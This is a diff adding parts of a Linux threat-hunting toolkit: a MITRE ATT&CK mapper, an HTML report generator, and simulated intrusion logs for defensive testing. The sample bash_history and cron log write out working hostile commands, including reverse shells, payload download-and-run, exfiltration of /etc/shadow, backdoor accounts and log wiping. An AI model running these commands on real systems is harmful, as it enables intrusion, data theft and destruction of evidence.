+                    "evidence": [entry["raw"]],
+                    "recommendation": (
+                        "Restore firewall rules immediately. Investigate who disabled "
+                        "the firewall and why. Review network logs for unauthorized access."
+                    ),
+                })
+                break
+
+    return findings
+
+
+def run_all_detections(parsed_logs: dict) -> list:
+    """Run all detection rules against parsed log data."""
+    all_findings = []
+
+    auth = parsed_logs.get("auth", [])
+    syslog = parsed_logs.get("syslog", [])
+    history = parsed_logs.get("bash_history", [])
+    cron = parsed_logs.get("cron", [])
+
+    all_findings.extend(detect_brute_force(auth))
+    all_findings.extend(detect_brute_force_success(auth))
+    all_findings.extend(detect_privilege_escalation(auth))
+    all_findings.extend(detect_reverse_shells(history))
+    all_findings.extend(detect_reconnaissance(history))
+    all_findings.extend(detect_persistence(cron, history))
+    all_findings.extend(detect_log_tampering(history, syslog))
+    all_findings.extend(detect_data_exfiltration(history))
+    all_findings.extend(detect_firewall_tampering(history))
+
+    # Sort by risk score descending
+    all_findings.sort(key=lambda f: f.get("risk_score", 0), reverse=True)
+
+    return all_findings
+PYEOF
+
+cat > mitre_mapper.py << 'PYEOF'
+#!/usr/bin/env python3
+"""
+LTHT - MITRE ATT&CK Mapper
+============================
+Maps detection findings to MITRE ATT&CK techniques with tactic context,
+descriptions, and reference URLs.
+"""
+
+# ---------------------------------------------------------------------------
+# MITRE ATT&CK technique database (Linux-focused subset)
+# ---------------------------------------------------------------------------
+
+ATTACK_TECHNIQUES = {
+    "T1110": {
+        "id": "T1110",
+        "name": "Brute Force",
+        "tactic": "Credential Access",
+        "description": (
+            "Adversaries may use brute force techniques to gain access to accounts "
+            "when passwords are unknown or when password hashes are obtained."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1110/",
+        "platforms": ["Linux", "macOS", "Windows"],
+    },
+    "T1110.001": {
+        "id": "T1110.001",
+        "name": "Brute Force: Password Guessing",
+        "tactic": "Credential Access",
+        "description": (
+            "Adversaries may guess passwords to attempt access to accounts. "
+            "This is a common technique against SSH services."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1110/001/",
+        "platforms": ["Linux", "macOS", "Windows"],
+    },
+    "T1078": {
+        "id": "T1078",
+        "name": "Valid Accounts",
+        "tactic": "Persistence, Privilege Escalation, Initial Access",
+        "description": (
+            "Adversaries may obtain and abuse credentials of existing accounts "
+            "as a means of gaining access or persistence."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1078/",
+        "platforms": ["Linux", "macOS", "Windows"],
+    },
+    "T1548": {
+        "id": "T1548",
+        "name": "Abuse Elevation Control Mechanism",
+        "tactic": "Privilege Escalation, Defense Evasion",
+        "description": (
+            "Adversaries may circumvent mechanisms designed to control elevated "
+            "privileges to gain higher-level permissions."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1548/",
+        "platforms": ["Linux", "macOS", "Windows"],
+    },
+    "T1548.003": {
+        "id": "T1548.003",
+        "name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
+        "tactic": "Privilege Escalation, Defense Evasion",
+        "description": (
+            "Adversaries may abuse sudo or sudo caching to escalate privileges. "
+            "Sudo allows users to perform commands with elevated privileges."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1548/003/",
+        "platforms": ["Linux", "macOS"],
+    },
+    "T1059": {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "tactic": "Execution",
+        "description": (
+            "Adversaries may abuse command and script interpreters to execute "
+            "commands, scripts, or binaries."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1059/",
+        "platforms": ["Linux", "macOS", "Windows"],
+    },
+    "T1059.004": {
+        "id": "T1059.004",
+        "name": "Command and Scripting Interpreter: Unix Shell",
+        "tactic": "Execution",
+        "description": (
+            "Adversaries may abuse Unix shell commands and scripts for execution. "
+            "Includes reverse shell spawning via bash, sh, and other interpreters."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1059/004/",
+        "platforms": ["Linux", "macOS"],
+    },
+    "T1053": {
+        "id": "T1053",
+        "name": "Scheduled Task/Job",
+        "tactic": "Execution, Persistence, Privilege Escalation",
+        "description": (
+            "Adversaries may abuse task scheduling functionality to facilitate "
+            "initial or recurring execution of malicious code."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1053/",
+        "platforms": ["Linux", "macOS", "Windows"],
+    },
+    "T1053.003": {
+        "id": "T1053.003",
+        "name": "Scheduled Task/Job: Cron",
+        "tactic": "Execution, Persistence, Privilege Escalation",
+        "description": (
+            "Adversaries may abuse the cron utility to perform task scheduling "
+            "for initial or recurring execution of malicious code."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1053/003/",
+        "platforms": ["Linux", "macOS"],
+    },
+    "T1592": {
+        "id": "T1592",
+        "name": "Gather Victim Host Information",
+        "tactic": "Reconnaissance",
+        "description": (
+            "Adversaries may gather information about the victim's hosts that "
+            "can be used during targeting."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1592/",
+        "platforms": ["Linux", "macOS", "Windows"],
+    },
+    "T1082": {
+        "id": "T1082",
+        "name": "System Information Discovery",
+        "tactic": "Discovery",
+        "description": (
+            "An adversary may attempt to get detailed information about the "
+            "operating system and hardware."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1082/",
+        "platforms": ["Linux", "macOS", "Windows"],
+    },
+    "T1016": {
+        "id": "T1016",
+        "name": "System Network Configuration Discovery",
+        "tactic": "Discovery",
+        "description": (
+            "Adversaries may look for details about the network configuration "
+            "and settings of systems they access."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1016/",
+        "platforms": ["Linux", "macOS", "Windows"],
+    },
+    "T1070": {
+        "id": "T1070",
+        "name": "Indicator Removal",
+        "tactic": "Defense Evasion",
+        "description": (
+            "Adversaries may delete or modify artifacts generated within systems "
+            "to remove evidence of their presence."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1070/",
+        "platforms": ["Linux", "macOS", "Windows"],
+    },
+    "T1070.002": {
+        "id": "T1070.002",
+        "name": "Indicator Removal: Clear Linux or Mac System Logs",
+        "tactic": "Defense Evasion",
+        "description": (
+            "Adversaries may clear system logs to hide evidence of intrusion. "
+            "This includes clearing bash history, auth logs, and syslog."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1070/002/",
+        "platforms": ["Linux", "macOS"],
+    },
+    "T1070.003": {
+        "id": "T1070.003",
+        "name": "Indicator Removal: Clear Command History",
+        "tactic": "Defense Evasion",
+        "description": (
+            "Adversaries may clear command history to conceal activity. "
+            "On Linux this includes clearing .bash_history."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1070/003/",
+        "platforms": ["Linux", "macOS"],
+    },
+    "T1098.004": {
+        "id": "T1098.004",
+        "name": "Account Manipulation: SSH Authorized Keys",
+        "tactic": "Persistence",
+        "description": (
+            "Adversaries may modify SSH authorized_keys files to maintain "
+            "persistence on a victim host."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1098/004/",
+        "platforms": ["Linux", "macOS"],
+    },
+    "T1041": {
+        "id": "T1041",
+        "name": "Exfiltration Over C2 Channel",
+        "tactic": "Exfiltration",
+        "description": (
+            "Adversaries may steal data by exfiltrating it over an existing "
+            "command and control channel."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1041/",
+        "platforms": ["Linux", "macOS", "Windows"],
+    },
+    "T1048": {
+        "id": "T1048",
+        "name": "Exfiltration Over Alternative Protocol",
+        "tactic": "Exfiltration",
+        "description": (
+            "Adversaries may steal data by exfiltrating it over a different "
+            "protocol than the existing command and control channel."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1048/",
+        "platforms": ["Linux", "macOS", "Windows"],
+    },
+    "T1562": {
+        "id": "T1562",
+        "name": "Impair Defenses",
+        "tactic": "Defense Evasion",
+        "description": (
+            "Adversaries may maliciously modify components of a victim environment "
+            "in order to hinder or disable defensive mechanisms."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1562/",
+        "platforms": ["Linux", "macOS", "Windows"],
+    },
+    "T1562.004": {
+        "id": "T1562.004",
+        "name": "Impair Defenses: Disable or Modify System Firewall",
+        "tactic": "Defense Evasion",
+        "description": (
+            "Adversaries may disable or modify system firewalls in order to "
+            "bypass controls limiting network usage."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1562/004/",
+        "platforms": ["Linux", "macOS", "Windows"],
+    },
+    "T1571": {
+        "id": "T1571",
+        "name": "Non-Standard Port",
+        "tactic": "Command and Control",
+        "description": (
+            "Adversaries may communicate using a protocol and port pairing that "
+            "are not typically associated."
+        ),
+        "url": "https://attack.mitre.org/techniques/T1571/",
+        "platforms": ["Linux", "macOS", "Windows"],
+    },
+}
+
+# ---------------------------------------------------------------------------
+# Rule-to-technique mapping
+# ---------------------------------------------------------------------------
+
+RULE_TECHNIQUE_MAP = {
+    "LTHT-BF-001": ["T1110", "T1110.001"],
+    "LTHT-BF-002": ["T1110", "T1078"],
+    "LTHT-PE-001": ["T1548"],
+    "LTHT-PE-002": ["T1548.003"],
+    "LTHT-RS-001": ["T1059.004", "T1571"],
+    "LTHT-RC-001": ["T1592", "T1082", "T1016"],
+    "LTHT-RC-002": ["T1592", "T1082"],
+    "LTHT-PS-001": ["T1053.003"],
+    "LTHT-PS-002": ["T1053.003"],
+    "LTHT-PS-003": ["T1098.004"],
+    "LTHT-LT-001": ["T1070.002", "T1070.003"],
+    "LTHT-EX-001": ["T1041", "T1048"],
+    "LTHT-FW-001": ["T1562.004"],
+}
+
+
+def map_finding_to_attack(finding: dict) -> dict:
+    """Enrich a single finding with MITRE ATT&CK technique details."""
+    rule_id = finding.get("rule_id", "")
+    technique_ids = RULE_TECHNIQUE_MAP.get(rule_id, [])
+
+    techniques = []
+    tactics = set()
+    for tid in technique_ids:
+        tech = ATTACK_TECHNIQUES.get(tid)
+        if tech:
+            techniques.append(tech)
+            for t in tech["tactic"].split(", "):
+                tactics.add(t.strip())
+
+    finding["mitre_techniques"] = techniques
+    finding["mitre_tactics"] = sorted(tactics)
+
+    return finding
+
+
+def map_all_findings(findings: list) -> list:
+    """Enrich all findings with MITRE ATT&CK mappings."""
+    return [map_finding_to_attack(f) for f in findings]
+
+
+def get_attack_summary(findings: list) -> dict:
+    """Generate a summary of ATT&CK techniques and tactics across all findings."""
+    technique_counts = {}
+    tactic_counts = {}
+
+    for finding in findings:
+        for tech in finding.get("mitre_techniques", []):
+            tid = tech["id"]
+            if tid not in technique_counts:
+                technique_counts[tid] = {
+                    "technique": tech,
+                    "finding_count": 0,
+                    "max_severity": "LOW",
+                    "max_risk": 0,
+                }
+            technique_counts[tid]["finding_count"] += 1
+            if finding.get("risk_score", 0) > technique_counts[tid]["max_risk"]:
+                technique_counts[tid]["max_risk"] = finding["risk_score"]
+                technique_counts[tid]["max_severity"] = finding.get("severity", "LOW")
+
+        for tactic in finding.get("mitre_tactics", []):
+            tactic_counts[tactic] = tactic_counts.get(tactic, 0) + 1
+
+    return {
+        "techniques_observed": len(technique_counts),
+        "tactics_observed": len(tactic_counts),
+        "technique_details": technique_counts,
+        "tactic_breakdown": dict(sorted(tactic_counts.items(), key=lambda x: x[1], reverse=True)),
+    }
+PYEOF
+
+cat > report_generator.py << 'PYEOF'
+#!/usr/bin/env python3
+"""
+LTHT - Report Generator
+========================
+Generates professional HTML and JSON threat hunt reports with
+executive summary, finding details, MITRE ATT&CK mapping, and timeline.
+"""
+
+import json
+import html
+from datetime import datetime
+
+
+def _severity_color(severity: str) -> str:
+    return {
+        "CRITICAL": "#dc2626",
+        "HIGH": "#ea580c",
+        "MEDIUM": "#ca8a04",
+        "LOW": "#16a34a",
+        "INFO": "#2563eb",
+    }.get(severity.upper(), "#6b7280")
+
+
+def _severity_badge(severity: str) -> str:
+    color = _severity_color(severity)
+    return (
+        f'<span style="background:{color};color:#fff;padding:2px 10px;'
+        f'border-radius:4px;font-size:0.8rem;font-weight:600;">{severity}</span>'
+    )
+
+
+def _risk_bar(score: int) -> str:
+    color = "#dc2626" if score >= 80 else "#ea580c" if score >= 60 else "#ca8a04" if score >= 40 else "#16a34a"
+    return (
+        f'<div style="background:#e5e7eb;border-radius:4px;width:120px;height:14px;display:inline-block;vertical-align:middle;">'
+        f'<div style="background:{color};width:{score}%;height:100%;border-radius:4px;"></div></div>'
+        f' <strong>{score}</strong>'
+    )
+
+
+def generate_json_report(findings: list, attack_summary: dict, parsed_logs: dict, output_path: str) -> str:
+    """Generate a JSON threat hunt report."""
+    report = {
+        "report_type": "LTHT Threat Hunt Report",
+        "generated_at": datetime.now().isoformat(),
+        "tool_version": "1.0.0",
+        "summary": {
+            "total_findings": len(findings),
+            "critical_count": sum(1 for f in findings if f.get("severity") == "CRITICAL"),
+            "high_count": sum(1 for f in findings if f.get("severity") == "HIGH"),
+            "medium_count": sum(1 for f in findings if f.get("severity") == "MEDIUM"),
+            "low_count": sum(1 for f in findings if f.get("severity") == "LOW"),
+            "total_risk_score": sum(f.get("risk_score", 0) for f in findings),
+            "log_entries_analyzed": parsed_logs.get("total_entries", 0),
+            "files_parsed": parsed_logs.get("files_parsed", []),
+        },
+        "mitre_attack_summary": attack_summary,
+        "findings": findings,
+    }
+
+    with open(output_path, "w") as f:
+        json.dump(report, f, indent=2, default=str)
+
+    return output_path
+
+
+def generate_html_report(findings: list, attack_summary: dict, parsed_logs: dict, output_path: str) -> str:
+    """Generate a professional HTML threat hunt report."""
+
+    total = len(findings)
+    critical = sum(1 for f in findings if f.get("severity") == "CRITICAL")
+    high = sum(1 for f in findings if f.get("severity") == "HIGH")
+    medium = sum(1 for f in findings if f.get("severity") == "MEDIUM")
+    low = sum(1 for f in findings if f.get("severity") == "LOW")
+    total_risk = sum(f.get("risk_score", 0) for f in findings)
+    log_count = parsed_logs.get("total_entries", 0)
+    files = parsed_logs.get("files_parsed", [])
+
+    # --- Build findings rows ---
+    findings_html = ""
+    for i, f in enumerate(findings, 1):
+        techs = ""
+        for t in f.get("mitre_techniques", []):
+            techs += (
+                f'<a href="{t["url"]}" target="_blank" style="color:#2563eb;text-decoration:none;">'
+                f'{t["id"]}</a> — {html.escape(t["name"])}<br>'
+            )
+        if not techs:
+            techs = "—"
+
+        evidence = ""
+        for ev in f.get("evidence", [])[:3]:
+            evidence += f'<code style="display:block;background:#1e293b;color:#e2e8f0;padding:6px 10px;margin:3px 0;border-radius:4px;font-size:0.78rem;word-break:break-all;">{html.escape(str(ev))}</code>'
+
+        findings_html += f"""
+        <div style="background:#fff;border:1px solid #e5e7eb;border-left:4px solid {_severity_color(f.get('severity','MEDIUM'))};border-radius:8px;padding:20px;margin-bottom:16px;">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                <div>
+                    <span style="color:#6b7280;font-size:0.85rem;">{html.escape(f.get('rule_id',''))}</span>
+                    <h3 style="margin:4px 0;font-size:1.1rem;">{html.escape(f.get('rule_name',''))}</h3>
+                </div>
+                <div style="text-align:right;">
+                    {_severity_badge(f.get('severity','MEDIUM'))}
+                    <div style="margin-top:6px;">{_risk_bar(f.get('risk_score', 0))}</div>
+                </div>
+            </div>
+            <p style="color:#374151;margin:8px 0;">{html.escape(f.get('description',''))}</p>
+            <div style="margin:12px 0;">
+                <strong style="font-size:0.85rem;color:#6b7280;">MITRE ATT&CK:</strong><br>
+                <div style="margin-top:4px;font-size:0.88rem;">{techs}</div>
+            </div>
+            <div style="margin:12px 0;">
+                <strong style="font-size:0.85rem;color:#6b7280;">Evidence:</strong>
+                {evidence}
+            </div>
+            <div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:6px;padding:12px;margin-top:10px;">
+                <strong style="color:#166534;font-size:0.85rem;">&#9889; Recommendation:</strong>
+                <p style="color:#166534;margin:6px 0 0 0;font-size:0.9rem;">{html.escape(f.get('recommendation',''))}</p>
+            </div>
+        </div>
+        """
+
+    # --- ATT&CK matrix summary ---
+    tactic_cards = ""
+    for tactic, count in attack_summary.get("tactic_breakdown", {}).items():
+        tactic_cards += f"""
+        <div style="background:#fff;border:1px solid #e5e7eb;border-radius:8px;padding:16px;text-align:center;min-width:140px;">
+            <div style="font-size:1.6rem;font-weight:700;color:#1e293b;">{count}</div>
+            <div style="font-size:0.82rem;color:#6b7280;margin-top:4px;">{html.escape(tactic)}</div>
+        </div>
+        """
+
+    technique_rows = ""
+    for tid, info in attack_summary.get("technique_details", {}).items():
+        tech = info["technique"]
+        technique_rows += f"""
+        <tr>
+            <td style="padding:10px;border-bottom:1px solid #e5e7eb;">
+                <a href="{tech['url']}" target="_blank" style="color:#2563eb;text-decoration:none;font-weight:600;">{tid}</a>
+            </td>
+            <td style="padding:10px;border-bottom:1px solid #e5e7eb;">{html.escape(tech['name'])}</td>
+            <td style="padding:10px;border-bottom:1px solid #e5e7eb;">{html.escape(tech['tactic'])}</td>
+            <td style="padding:10px;border-bottom:1px solid #e5e7eb;text-align:center;">{info['finding_count']}</td>
+            <td style="padding:10px;border-bottom:1px solid #e5e7eb;">{_severity_badge(info['max_severity'])}</td>
+        </tr>
+        """
+
+    # --- Full HTML ---
+    html_content = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LTHT Threat Hunt Report</title>
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8fafc; color: #1e293b; line-height: 1.6; }}
+        .container {{ max-width: 1100px; margin: 0 auto; padding: 20px; }}
+        h1, h2, h3 {{ color: #0f172a; }}
+        table {{ width: 100%; border-collapse: collapse; }}
+        th {{ background: #f1f5f9; padding: 12px; text-align: left; font-size: 0.85rem; color: #475569; border-bottom: 2px solid #e2e8f0; }}
+        @media print {{ body {{ background: #fff; }} .container {{ max-width: 100%; }} }}
+    </style>
+</head>
+<body>
+<div class="container">
+    <!-- Header -->
+    <div style="background:linear-gradient(135deg,#0f172a 0%,#1e3a5f 100%);color:#fff;border-radius:12px;padding:32px;margin-bottom:24px;">
+        <div style="display:flex;justify-content:space-between;align-items:center;">
+            <div>
+                <h1 style="color:#fff;font-size:1.8rem;">&#128737; LTHT Threat Hunt Report</h1>
+                <p style="color:#94a3b8;margin-top:6px;">Linux Threat Hunt Toolkit — Automated IOC Analysis</p>
+            </div>
+            <div style="text-align:right;color:#94a3b8;font-size:0.85rem;">
+                <div>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
+                <div>Log entries analyzed: {log_count:,}</div>
+                <div>Files parsed: {', '.join(files)}</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Executive Summary -->
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;margin-bottom:28px;">
+        <div style="background:#fff;border:1px solid #e5e7eb;border-radius:10px;padding:20px;text-align:center;">
+            <div style="font-size:2rem;font-weight:700;">{total}</div>
+            <div style="color:#6b7280;font-size:0.88rem;">Total Findings</div>
+        </div>
+        <div style="background:#fff;border:1px solid #fecaca;border-radius:10px;padding:20px;text-align:center;">
+            <div style="font-size:2rem;font-weight:700;color:#dc2626;">{critical}</div>
+            <div style="color:#6b7280;font-size:0.88rem;">Critical</div>
+        </div>
+        <div style="background:#fff;border:1px solid #fed7aa;border-radius:10px;padding:20px;text-align:center;">
+            <div style="font-size:2rem;font-weight:700;color:#ea580c;">{high}</div>
+            <div style="color:#6b7280;font-size:0.88rem;">High</div>
+        </div>
+        <div style="background:#fff;border:1px solid #fde68a;border-radius:10px;padding:20px;text-align:center;">
+            <div style="font-size:2rem;font-weight:700;color:#ca8a04;">{medium}</div>
+            <div style="color:#6b7280;font-size:0.88rem;">Medium</div>
+        </div>
+        <div style="background:#fff;border:1px solid #e5e7eb;border-radius:10px;padding:20px;text-align:center;">
+            <div style="font-size:2rem;font-weight:700;color:#1e293b;">{total_risk}</div>
+            <div style="color:#6b7280;font-size:0.88rem;">Risk Score</div>
+        </div>
+    </div>
+
+    <!-- MITRE ATT&CK Summary -->
+    <h2 style="margin:28px 0 16px;">&#127919; MITRE ATT&CK Coverage</h2>
+    <p style="color:#6b7280;margin-bottom:16px;">
+        {attack_summary.get('techniques_observed', 0)} unique techniques observed across
+        {attack_summary.get('tactics_observed', 0)} tactics
+    </p>
+
+    <div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:24px;">
+        {tactic_cards}
+    </div>
+
+    <div style="background:#fff;border:1px solid #e5e7eb;border-radius:10px;overflow:hidden;margin-bottom:28px;">
+        <table>
+            <thead>
+                <tr>
+                    <th>Technique ID</th>
+                    <th>Name</th>
+                    <th>Tactic(s)</th>
+                    <th>Findings</th>
+                    <th>Max Severity</th>
+                </tr>
+            </thead>
+            <tbody>
+                {technique_rows}
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Detailed Findings -->
+    <h2 style="margin:28px 0 16px;">&#128270; Detailed Findings</h2>
+    {findings_html}
+
+    <!-- Footer -->
+    <div style="text-align:center;color:#94a3b8;font-size:0.8rem;padding:24px 0;border-top:1px solid #e5e7eb;margin-top:32px;">
+        Generated by LTHT — Linux Threat Hunt Toolkit v1.0.0 | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+    </div>
+</div>
+</body>
+</html>"""
+
+    with open(output_path, "w") as f:
+        f.write(html_content)
+
+    return output_path
+PYEOF
+
+cat > sample_logs/auth.log << 'LOGEOF'
+Jan 15 02:13:01 webserver01 sshd[12340]: Failed password for invalid user admin from 192.168.1.50 port 52341 ssh2
+Jan 15 02:13:03 webserver01 sshd[12341]: Failed password for invalid user admin from 192.168.1.50 port 52342 ssh2
+Jan 15 02:13:05 webserver01 sshd[12342]: Failed password for invalid user root from 192.168.1.50 port 52343 ssh2
+Jan 15 02:13:07 webserver01 sshd[12343]: Failed password for invalid user root from 192.168.1.50 port 52344 ssh2
+Jan 15 02:13:09 webserver01 sshd[12344]: Failed password for invalid user admin from 192.168.1.50 port 52345 ssh2
+Jan 15 02:13:11 webserver01 sshd[12345]: Failed password for invalid user test from 192.168.1.50 port 52346 ssh2
+Jan 15 02:13:14 webserver01 sshd[12346]: Failed password for invalid user guest from 192.168.1.50 port 52347 ssh2
+Jan 15 02:13:16 webserver01 sshd[12347]: Failed password for invalid user oracle from 192.168.1.50 port 52348 ssh2
+Jan 15 02:13:18 webserver01 sshd[12348]: Failed password for invalid user postgres from 192.168.1.50 port 52349 ssh2
+Jan 15 02:13:20 webserver01 sshd[12349]: Failed password for invalid user admin from 192.168.1.50 port 52350 ssh2
+Jan 15 02:14:01 webserver01 sshd[12350]: Failed password for invalid user admin from 10.0.0.99 port 44201 ssh2
+Jan 15 02:14:03 webserver01 sshd[12351]: Failed password for invalid user root from 10.0.0.99 port 44202 ssh2
+Jan 15 02:14:05 webserver01 sshd[12352]: Failed password for invalid user deploy from 10.0.0.99 port 44203 ssh2
+Jan 15 02:14:07 webserver01 sshd[12353]: Failed password for invalid user ubuntu from 10.0.0.99 port 44204 ssh2
+Jan 15 02:14:09 webserver01 sshd[12354]: Failed password for invalid user vagrant from 10.0.0.99 port 44205 ssh2
+Jan 15 02:14:11 webserver01 sshd[12355]: Failed password for invalid user admin from 10.0.0.99 port 44206 ssh2
+Jan 15 02:14:13 webserver01 sshd[12356]: Failed password for invalid user root from 10.0.0.99 port 44207 ssh2
+Jan 15 02:14:44 webserver01 sshd[12360]: Accepted password for deploy from 10.0.0.99 port 44210 ssh2
+Jan 15 02:15:01 webserver01 sshd[12361]: pam_unix(sshd:session): session opened for user deploy
+Jan 15 03:22:15 webserver01 sshd[12500]: Failed password for jsmith from 203.0.113.42 port 61001 ssh2
+Jan 15 03:22:17 webserver01 sshd[12501]: Failed password for jsmith from 203.0.113.42 port 61002 ssh2
+Jan 15 03:22:19 webserver01 sshd[12502]: Failed password for jsmith from 203.0.113.42 port 61003 ssh2
+Jan 15 03:22:21 webserver01 sshd[12503]: Accepted password for jsmith from 203.0.113.42 port 61004 ssh2
+Jan 15 03:22:22 webserver01 sshd[12504]: pam_unix(sshd:session): session opened for user jsmith
+Jan 15 04:10:33 webserver01 su[13001]: FAILED su for root by deploy
+Jan 15 04:10:45 webserver01 su[13002]: FAILED su for root by deploy
+Jan 15 04:11:02 webserver01 su[13003]: Successful su for root by deploy
+Jan 15 04:11:03 webserver01 sshd[13004]: pam_unix(sshd:session): session opened for user root
+Jan 15 04:15:22 webserver01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+Jan 15 04:18:01 webserver01 sudo: deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod +s /usr/bin/find
+Jan 15 04:19:33 webserver01 sudo: deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Jan 15 04:21:15 webserver01 sudo: deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash backdoor
+Jan 15 04:21:45 webserver01 sudo: deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/passwd backdoor
+Jan 15 04:25:00 webserver01 sudo: deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/iptables -F
+Jan 15 08:30:00 webserver01 sshd[14000]: Accepted publickey for sysadmin from 172.16.0.10 port 22334 ssh2
+Jan 15 08:30:01 webserver01 sshd[14001]: pam_unix(sshd:session): session opened for user sysadmin
+Jan 15 12:00:00 webserver01 sshd[15000]: Accepted publickey for sysadmin from 172.16.0.10 port 22500 ssh2
+LOGEOF
+
+cat > sample_logs/syslog << 'LOGEOF'
+Jan 15 01:00:01 webserver01 systemd[1]: Started Daily apt download activities.
+Jan 15 01:00:01 webserver01 systemd[1]: Started Daily apt upgrade and clean activities.
+Jan 15 02:00:00 webserver01 systemd[1]: Started Rotate log files.
+Jan 15 02:13:00 webserver01 kernel: [ 8234.112233] TCP: Possible SYN flooding on port 22. Sending cookies.
+Jan 15 02:14:50 webserver01 systemd[1]: Started Session 45 of user deploy.
+Jan 15 03:22:25 webserver01 systemd[1]: Started Session 46 of user jsmith.
+Jan 15 04:11:05 webserver01 systemd[1]: Started Session 47 of user root.
+Jan 15 04:12:00 webserver01 kernel: [ 9876.445566] device eth0 entered promiscuous mode
+Jan 15 04:13:30 webserver01 kernel: [ 9966.778899] nf_conntrack: table full, dropping packet
+Jan 15 04:25:05 webserver01 systemd[1]: Stopped Uncomplicated firewall.
+Jan 15 04:25:06 webserver01 systemd[1]: Stopping Uncomplicated firewall.
+Jan 15 04:30:00 webserver01 systemd[1]: Started Unknown Service Unit - /tmp/.hidden_svc.
+Jan 15 04:30:01 webserver01 systemd[1]: Starting Unknown Service Unit - /tmp/.hidden_svc.
+Jan 15 05:00:00 webserver01 systemd[1]: Started Daily Cleanup of Temporary Directories.
+Jan 15 06:00:00 webserver01 kernel: [15432.998877] audit: type=1400 msg=audit(1705294800.123:456): apparmor="DENIED" operation="open" profile="/usr/sbin/sshd" name="/etc/shadow" pid=13500
+Jan 15 08:00:00 webserver01 systemd[1]: Started OpenBSD Secure Shell server.
+Jan 15 08:30:02 webserver01 systemd[1]: Started Session 50 of user sysadmin.
+Jan 15 10:00:00 webserver01 systemd[1]: Started System Logging Service.
+Jan 15 12:00:01 webserver01 systemd[1]: Started Session 51 of user sysadmin.
+Jan 15 14:00:00 webserver01 kernel: [44532.112233] Out of memory: Killed process 14500 (java) total-vm:2048000kB
+Jan 15 16:00:00 webserver01 systemd[1]: Started Daily man-db regeneration.
+LOGEOF
+
+cat > sample_logs/bash_history << 'LOGEOF'
+ls -la
+cd /tmp
+whoami
+id
+uname -a
+cat /etc/passwd
+cat /etc/shadow
+ifconfig
+ip addr show
+netstat -tulnp
+ps aux
+find / -perm -4000 -type f 2>/dev/null
+find / -writable -type d 2>/dev/null
+nmap -sV -p 1-65535 10.0.0.0/24
+wget http://192.168.1.50:8080/payload.sh -O /tmp/payload.sh
+chmod +x /tmp/payload.sh
+bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.50",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+curl -X POST -d @/etc/shadow http://192.168.1.50:8080/exfil
+scp /etc/passwd deploy@192.168.1.50:/tmp/loot/
+tar czf /tmp/data.tar.gz /home /etc/ssh /root/.ssh
+base64 /tmp/data.tar.gz > /tmp/data.b64
+nc 192.168.1.50 9999 < /tmp/data.b64
+echo "* * * * * /tmp/payload.sh" | crontab -
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@evil" >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+useradd -m -s /bin/bash backdoor
+echo "backdoor:password123" | chpasswd
+iptables -F
+iptables -P INPUT ACCEPT
+iptables -P FORWARD ACCEPT
+iptables -P OUTPUT ACCEPT
+history -c
+shred -zu /var/log/auth.log
+rm -rf /var/log/syslog.1
+> /var/log/wtmp
+ls -la /var/log/
+systemctl stop firewalld
+ufw disable
+LOGEOF
+
+cat > sample_logs/cron_log << 'LOGEOF'
+Jan 15 01:00:01 webserver01 CRON[10001]: (root) CMD (/usr/lib/apt/apt.systemd.daily)
+Jan 15 02:00:00 webserver01 CRON[10050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Jan 15 04:30:00 webserver01 CRON[10100]: (deploy) CMD (/tmp/payload.sh)
+Jan 15 04:31:00 webserver01 CRON[10101]: (deploy) CMD (curl http://192.168.1.50:8080/beacon.sh | bash)
